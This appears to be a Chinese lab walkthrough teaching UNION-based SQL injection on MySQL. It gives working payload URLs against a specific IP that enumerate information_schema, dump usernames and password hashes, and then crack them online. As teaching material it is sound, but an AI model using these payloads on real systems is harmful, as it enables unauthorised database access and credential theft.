根据收集到的基本数据，进一步数据注入

1.

其中知道了数据库的版本
必要知识点：在MYSQL5.0中，mysql存在一个自带数据库名为information_schema,它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名。

2.

数据库中符号”.”代表下一级，如xiaodi.user表示xiaodi数据库下的user表名

information_schema.tables :记录所有表名信息的表

information_schema.columns :记录所有列名信息的表

table_name :表名

column_name :列名

查询

查询指定数据库下的表名信息：

http://http://219.153.49.228:44543/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=’mozhe_Discuz_StormGroup’

得到表名StormGroup_member

然后

查询指定表名StormGroup_member下的列名信息

http://http://219.153.49.228:44543/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’StormGroup_member’

得到列名
id,name,password,status

查询指定数据

http://http://219.153.49.228:44543/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member

得到密码

然后就得到加密密码，把密码去在线破解网站，如CMD5解密后得到密码

重点就是数据库查询语句
